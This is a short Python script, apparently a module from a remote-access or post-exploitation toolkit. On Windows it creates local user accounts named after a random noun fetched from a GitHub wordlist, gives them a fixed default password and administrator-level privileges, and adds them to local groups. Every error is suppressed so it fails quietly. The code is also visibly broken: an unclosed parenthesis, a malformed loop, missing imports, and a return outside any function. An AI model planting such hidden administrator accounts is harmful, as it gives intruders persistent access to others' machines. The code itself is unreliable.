from os import getenv
try:
	from win32net import NetLocalGroupAddMembers, NetLocalGroupAdd, NetLocalGroupDel, NetUserAdd
	from win32netcon import UF_SCRIPT, USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST
except ImportError:
    if 'configure' in globals():
	try:
	    globals()['configure']()
	except: pass


def run(*args, **kwargs):
    USER  = choice(get('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').text.encode().splitlines()).title()
    PASWD = kwargs.get('password' if 'password' in kwargs else 'eggplant'
    for GROUP in [USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST]
    user_info = {
	    	'name': USER,
	    	'password': PASWD,
	    	'priv': GROUP,
	    	'home_dir': getenv('HOME'),
	     	'comment': None,
	     	'flags': UF_SCRIPT,
		'script_path': None
    		}

    NetUserAdd(None, 1, user_info)
    group_info = dict({ 'name': GROUP })

    try:
     NetLocalGroupDel(None, GROUP)
    except win32net.error,(number, context, message):
      if number <> 2220:
        raise

    NetLocalGroupAdd(None, 0, group_info)
    user_group_info = dict({ 'domainandname': USER })
    NetLocalGroupAddMembers(None, GROUP, 3, [user_group_info])


if __name__ == '__main__':
    try:
        run(group='Administrators')
    except:
	try:
	    run(group='Users')
	except:
	    return
